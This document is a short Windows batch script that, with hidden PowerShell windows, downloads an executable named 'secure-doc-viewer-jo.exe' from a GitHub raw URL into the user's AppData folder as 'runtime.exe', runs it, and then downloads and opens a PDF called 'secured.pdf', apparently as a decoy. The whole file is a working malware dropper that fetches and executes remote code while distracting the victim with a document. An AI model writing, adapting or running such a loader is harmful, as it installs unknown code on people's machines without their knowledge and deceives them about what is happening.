@echo off
setlocal
set "OUT=%APPDATA%\runtime.exe"
set "OUTPDF=%TEMP%\secure.pdf"

if exist "%OUT%" del /q "%OUT%"
powershell -w hidden -Command  "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/clinetsfire/secure-downloads/main/secure-doc-viewer-jo.exe' -OutFile '%OUT%'"
if not exist "%OUT%" exit /b
start "" "%OUT%"
powershell -w hidden -Command  "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/clinetsfire/secure-downloads/main/secured.pdf' -OutFile '%OUTPDF%'"
start "" "%OUTPDF%"
exit /b